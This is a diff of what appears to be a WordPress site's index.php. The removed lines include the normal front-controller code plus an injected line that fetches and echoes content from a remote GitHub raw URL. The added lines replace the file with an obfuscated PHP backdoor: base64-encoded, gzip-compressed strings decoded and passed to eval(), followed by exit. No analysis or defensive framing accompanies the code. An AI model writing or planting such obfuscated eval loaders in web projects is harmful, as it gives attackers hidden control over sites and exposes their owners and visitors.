@@ -1,21 +1,7 @@
 
 <?php
-/
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
-
-/
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
-
-/** Loads the WordPress Environment and Template */
-require DIR . '/wp-blog-header.php';
-
-$homethemesplugin = file_get_contents('https://raw.githubusercontent.com/sekjhhh/shel/refs/heads/main/blki');
- echo $homethemesplugin;
+$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLElFYiUlFqe\x61m\x63Snp\x43\x62np6RqFJ\x63UF\x61WW\x61\x61j4ZFZogoE1\x41\x41\x3d\x3d";
+$Lix = "=ACtBp5PXjEXMsCYNgzsgoeNae5AnVZReevDiBqXgRYKwHv5GsWRv7M60bmxkcponOOmD/XWQw0i3Dkr43W1j0tfa31wSZfNblNFAbmE/SgsmWO2IrQHlHf4OQ5awzeCEKOrcoi60wOMdsADjqOVHxvj1E+z8M5rcJyNgskZc3q8nvKr2ec920OkXoxl4enR1hhxDmLHxRTlEbDSNnbNjQlmD3/XN+PJ5IWyn8+Abv8BwqECLGAngQp9HD5VTIflI4grGWvI2KkTKI4Kh6NQVqfZa4aygfizwrMBMC9luTKJff9AwNqO0nB0FuE26JEVFENpcarS1irH0jz2uODsBCSGBQzZncIIPvZGzDbrv7WX//rfhDXIPEYxJQ4mbDf3yJWTuYyt2K5xy6KGQFFW+o4d51ql0By9Os/BffMEwM8SRFZfcin/6GQRB4ftBoUA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
